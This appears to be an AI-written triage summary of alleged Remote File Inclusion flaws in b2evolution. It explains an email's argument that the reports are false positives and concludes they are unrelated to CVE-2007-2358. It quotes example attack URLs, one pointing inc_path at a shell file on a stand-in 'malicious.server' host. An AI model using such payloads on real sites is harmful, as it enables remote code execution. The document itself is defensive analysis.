The provided content discusses alleged Remote File Inclusion (RFI) vulnerabilities in b2evolution, but ultimately argues that these are false positives. Here's a breakdown:

**Root cause of vulnerability (alleged, but refuted):**
- The initial reports claimed that variables like `inc_path`, `view_path`, and others in various `b2evolution` PHP files are vulnerable to RFI via GET parameters.

**Weaknesses/vulnerabilities present (alleged):**
- Unsanitized user-controlled input in `inc_path`, `view_path`, `$control_path.$ctrl_mappings[$ctrl]`, and `$skins_path` variables in files like `a_noskin.php`, `a_stub.php`, `admin.php`, `contact.php`, `default.php`, `index.php`, `multiblogs.php`, and `summary.php`.

**Impact of exploitation (alleged):**
- Remote attackers could include arbitrary files from their own server.

**Attack vectors (alleged):**
- HTTP GET parameters, e.g., `b2evolution/blogs/a_noskin.php?require=shell?`, `b2evolution/blogs/admin.php?inc_path=http://malicious.server/shell.txt`

**Required attacker capabilities/position (alleged):**
- The attacker needs to be able to send HTTP requests to the vulnerable b2evolution installation.

**Why the claims are refuted:**
- The email argues that variables like `inc_path` are defined in `conf/_advanced.php` and included by `conf/_config.php` before their uses in all other relevant PHP files. This means these variables are initialized from the server's configuration and not directly from user input, preventing the RFI exploit from working.
- Similarly, the code also checks `$ctrl_mappings[$ctrl]` against a static list.

In summary, the content refutes the claimed RFI vulnerabilities due to the correct definition and initialization of variables used in file inclusion within b2evolution code. This makes the claims of the vulnerability invalid.

**Therefore, based on the provided content, this is UNRELATED to CVE-2007-2358**
